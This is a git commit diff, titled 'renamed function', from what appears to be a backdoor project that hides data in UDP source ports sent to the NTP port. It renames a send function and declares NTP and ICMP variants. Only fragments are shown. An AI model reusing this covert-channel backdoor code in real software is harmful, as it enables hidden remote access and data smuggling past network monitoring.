40259720917e3a164f85fd65031d5ca0d841bea3
Steve <kythyx@gmail.com>
2011-12-03 13:43:27 -0800

    renamed function

--- client.c
+++ client.c
@@ -79,7 +79,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 			src_port = (frame[0] << 8) + frame[i];
 			dst_port = PORT_NTP;
 			
-			_send(ipaddr, src_port, dst_port, TRUE);
+			_sendUDP(ipaddr, src_port, dst_port, TRUE);
 			
 			usleep(SLEEP_TIME);
 		}
--- inet.h
+++ inet.h
@@ -13,7 +13,9 @@ uint16 ip_csum(uint16 *ip_hdr, int num_words);
  */
 uint16 udp_csum(uint16 *ip_hdr, int num_words);
 uint resolve(char *hostname);
-void _send(uint32 dst_addr, uint16 src_port, uint16 dst_port, uint8 isReq);
+void _sendUDP(uint32 dst_addr, uint16 src_port, uint16 dst_port, uint8 isReq);
+void _sendNTP(uint32 dst_addr, uint16 src_port, uint16 dst_port, uint8 isReq);
+void _sendICMP(uint32 dst_addr, uint16 src_port, uint16 dst_port, uint8 isReq);
 void srv_recv(uint32 src_addr, FILE* file, uint8 keepPort);
 char* extract_udp(uint32 src_addr, char* data, int length);
 
